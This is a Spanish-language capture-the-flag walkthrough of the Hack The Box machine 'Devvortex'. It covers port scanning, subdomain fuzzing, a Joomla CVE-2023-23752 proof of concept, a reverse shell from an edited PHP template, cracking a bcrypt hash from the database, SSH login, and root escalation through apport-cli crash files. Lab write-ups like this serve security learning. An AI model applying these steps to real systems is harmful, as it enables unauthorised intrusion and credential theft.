


Hacemos un escaneo con nmap y vemos que tenemos estos puertos abierto y si ademas le pasamos `-sVC` vemos que hay un nombre de dominio que vamos a tener que agregar a nuestro archivo `/etc/hosts`
```bash
sudo nmap -sCV -p80,22 -n -Pn --min-rate 5000 10.10.11.242
```
![[Pasted image 20240116234030 1.png]]

vemos que hay un nombre de dominio ese es el que vamos a agregar al archivo `hosts`, y usamos [[wfuzz]] para buscar subdominios y encontraremos un `.dev`
```bash
wfuzz -c -t 100 --hc=404,403,302 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.10.10.11.242" 10.10.11.242
```

Bingo tenemos un subdominio (si miramos whatweb podemos ver que esta web esta basada en `Joomla` ), ahora vamos a hacer Fuzzing con [[wfuzz]] y vamos a buscar subdirectorios 

```bash
wfuzz -c -t 100 --hc=404,403 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://dev.devvortex.htb/FUZZ/
```

y encontramos un directorio `administrator` 
![[Pasted image 20240117001429 1.png]]

vemos claramente que esta usando un `joomla` por lo cual podemos ver cuales son los directorio clasicos de este gestor de contenido (https://www.cmsjunkie.com/blog/post/understanding-the-joomla-directory-structure)

![[Pasted image 20240117002317 1.png]]
si miramos el archivo readme podemos ver la versio de joomla la cual es vulnerable y si descargamos el exploit POC podemos ver lo siguiente
(https://github.com/Acceis/exploit-CVE-2023-23752)
![[Pasted image 20240117025818 1.png]]
ahora vamos a logearnos en la web `/administrator` y una vez dentro vamos a modificar un php para mandarnos una revershell 
![[Pasted image 20240117033334 1.png]]
ahora nos ponemos en escucha y accedemos a la web y ya tenemos la revershell

![[Pasted image 20240117033403 1.png]]
aplicamos el [[Tratamiento de la tty]], y si revisamos la bases de datos y las tablas llegamos a un hash del usuario logan
```mysql
mysql -u lewis --password
show databases;
use joomla;
show tables;
select * from sd4fg_users
```

![[Pasted image 20240117041141 1.png]]
ahora les hacemos fuerza burta, pasaando el hash de logan a un archivo por separado
```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
```
![[Pasted image 20240117041252 1.png]]

ahora podemos iniciar sesion en ssh
```bash
ssh logan@<ip>
```
![[Pasted image 20240117041329 1.png]]

vemos que tenemos permisos para ejecutar un binario con permisos de root
![[Pasted image 20240117041413 1.png]]
si vemos la version podemos ver que es vulnerable, asique vamos a explotarlo de esta forma (vamos a pasar al binario un archivo crash para que nos de la opcion de ponernos como root)
```bash
sleep 60 &
```
suspendemos la session
```bash
kill -SIGSEGV <PID>
```
la matamos 
```bash
ls /var/crash/
```
vemos si se ha generado el crash file
```bash
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
```
ejecutamos y le damos a la V para ver el reporte, y ahora como tenemosun texto muy largo vamos a ejecutar un comando aqui
![[Pasted image 20240117044301 1.png]]
![[Pasted image 20240117044321 1.png]]
y ya somos root
![[Pasted image 20240117044328 1.png]]
